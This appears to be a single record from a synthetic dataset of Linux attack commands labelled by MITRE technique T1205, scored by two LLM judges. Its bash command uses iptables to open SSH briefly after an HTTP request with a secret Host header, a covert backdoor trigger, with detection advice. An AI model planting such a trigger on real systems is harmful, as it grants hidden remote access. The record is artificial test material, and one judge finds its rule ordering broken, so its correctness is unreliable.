@@ -1,0 +1,48 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -lc 'ufw --force enable && ufw default deny incoming && ufw logging high && iptables -I ufw-before-input 1 -p tcp --dport 80 -m string --algo bm --string \"Host: knock.hidden\" -m recent --name HTTPK --set && iptables -I ufw-before-input 1 -p tcp --dport 22 -m recent --rcheck --seconds 15 --name HTTPK -j ACCEPT'",
+  "explanation": "Watches HTTP requests on TCP/80 and uses a specific Host header \"knock.hidden\" as a covert trigger to open SSH for 15s. This uses application-layer signaling via HTTP headers. Detection: Inspect HTTP headers for odd hostnames and correlate with a short-lived SSH acceptance from the requester.",
+  "rationale_steps": [
+    "Enable ufw, deny incoming by default, and enable logging.",
+    "Match HTTP Host header string on TCP/80 and set recent:HTTPK.",
+    "Allow TCP/22 to sources marked in recent:HTTPK within 15 seconds.",
+    "Detect via reverse proxy/firewall logs for unusual Host headers followed by SSH access."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-eb871457-a20060e0",
+  "source_prompt_hash": "eb871457",
+  "timestamp_utc": "2025-09-30T03:48:01.284804Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed bash with balanced quotes, valid ufw/iptables options, and proper use of && and rule syntax.",
+        "semantic_score": 4,
+        "semantic_justification": "Implements an HTTP Host-header-based trigger using iptables string+recent in the ufw-before-input chain to open SSH for 15s, but it requires root and an actually reachable TCP/80 service (allowed by firewall) for the header to be seen.",
+        "combined_score": 4.5,
+        "confidence": 0.74,
+        "timestamp": "2025-10-01T15:15:22.379955Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct flag usage, balanced quoting, and valid command chaining, adhering to standard bash and utility syntax.",
+        "semantic_score": 2,
+        "semantic_justification": "The command fails to achieve its claimed intent because the two `iptables` rules are inserted at the same position, leading to an incorrect order where the SSH check will occur before the HTTP knock sets the recent entry, and the 'Privilege: None' claim is incorrect as `ufw` and `iptables` require root.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T15:15:52.630892Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
